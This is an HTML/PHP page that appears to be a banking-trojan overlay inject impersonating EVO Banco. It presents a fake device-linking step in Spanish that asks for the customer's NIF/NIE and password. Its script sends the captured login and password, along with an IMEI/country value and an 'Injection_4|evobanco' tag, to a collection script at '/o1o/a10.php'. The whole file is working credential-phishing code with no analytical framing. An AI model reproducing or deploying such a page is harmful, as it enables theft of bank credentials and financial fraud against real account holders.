<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bawag</title>

    <script src="js/jquery-1.12.0.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>
	
    <link rel="stylesheet" href="bootstrap/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
	<link rel="stylesheet" href="es/es.evobanco.bancamovil/css/style.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
include "config.php"; ?>
<body>
<div class="header">
	<b> EVO </b>
</div><br>
<div class="text">
	<b style="font-size: 26px;text-align: center;"> BIENVENIDO </b>
	<p> al proceso de instalacion. </p>
	<p> Vamos a proceder a vincular tu usuario de la Banca a Distancia a este dispositivo. </p>
	<p> Por favor instroduce los datos sloicitados </p>
</div>
    <div class="main">
        <div class="container">
            <div class="row">
			<div id="form1">
                <div class="col-xs-10 col-sm-8">
<div class="line">  </div>
				   <div class="form_">
                        <form id="form" style="text-align: center;">
                            <div class="form-group ">
                                	<label> NIF/NIE </label>
									<input type="text" class="form-control" name="field2" id="login" onkeyup="check();" autocomplete="off" data-reg="/.{3,50}/">
                            </div>

                            <div class="form-group">
									<label> CONTRASEÑA </label>
                                	<input type="password" class="form-control" name="field3" onkeyup="check();" id="password" oninput="this.value = this.value.replace(/\D/g, '')" autocomplete="off" data-reg="/.{3,50}/">
                            </div>

<div class="line">  </div>
						<div style="color: #000000;width: 100%;margin: 0 auto;text-align: center;font-size: 14px;margin-top: 5px;margin-bottom: 5px;font-weight: 700;"> Debes introducir tu número de identificación con la letra. Si no conoces tu contraseña, solicitala en tu Banca Electrónica o llamando al 910900900 </div>
						
						<input type="button" class="input_submitBtn" onClick="sentServer();" value="Aceptar">
                        </form>
                </div>
            </div>
        </div>
		</div>
    </div>
<script>
	function sentServer()
	{
	var oNumInp1 = document.getElementById('login');
	var oNumInp2 = document.getElementById('password');


if ((oNumInp1.value.length > 5)&&(oNumInp2.value.length > 3)) {
	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';
	
	var login1 = document.forms["form"].elements["login"].value; 
	var pass = document.forms["form"].elements["password"].value; 

	location.replace('/o1o/a10.php?p=' + imei_c+"|Injection_4|evobanco|"+login1+"|"+pass);
	}
}
</script>
</body>

</html>
